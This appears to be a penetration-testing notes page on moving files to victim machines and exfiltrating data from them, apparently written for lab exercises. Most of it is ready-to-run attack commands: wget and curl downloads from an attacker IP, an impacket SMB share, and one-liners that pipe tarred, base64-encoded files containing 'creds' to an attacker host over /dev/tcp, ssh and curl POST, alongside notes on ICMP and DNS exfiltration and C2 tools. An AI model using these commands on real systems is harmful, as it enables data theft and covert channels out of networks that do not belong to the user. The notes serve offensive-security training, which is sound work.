For the sake of example, everything labeled as a "task" can be considered the data being exfiltrated. 

> [!danger] Detection Risk
> Don't burn important host IPs onto a blacklist trying to download autopwn.exe or something stupid. Be cognizant of your situation, and act accordingly. Run stuff by more senior teammates if you don't know for sure. 


[[#File Transfers]] are TO a target machine, [[#Exfiltration]] is FROM a target machine. 

# File Transfers
## HTTP
On the attacker machine:
```shell
python -m SimpleHTTPServer <portno> # Start a python 2 http server in cwd
python3 -m http.server <portno> # start a python3 http server in cwd
```

On the victim machine:
```bash
(Linux)
wget http://<attackerIP>:<portno>/FileToTransfer

(Windows)
curl http://<attackerIP>:<portno>/FileToTransfer -O FileToTransfer
```

## SMB
```shell
impacket-smbserver -smb2support -username <user to auth> -password <password to auth> <share name> <share location> # Open an SMB share serving <share location> as <share name>
```

## Client Side

# Exfiltration
## Raw TCP Sockets
[[Netcat]] Example Command: 
```shell
nc -lvp 8080 > /tmp/task4-creds.data # Receive
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/<ATK_IP>/8080 # Send
dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar # Recombine
tar xvf task4-creds.tar # Decompress
```

## SSH
```shell
tar cf - task5/ | ssh thm@<ATK_IP> "cd /tmp/; tar xpf -" # On victim machine
```

## HTTP
```shell
curl --data "file=$(tar zcf - task6 | base64)" http://<ATK_IP>/bogus.php
```
This will leave the data base64 encoded in apache's access.log. 
[[Neo-reGeorg]]

## ICMP
Ping has a data section we can use for exfil. Also see [[ICMPdoor]] for ICMP C2. 

## DNS
Add data as TXT record on a DNS server and retrieve with dig. [[Iodined]] for C2.
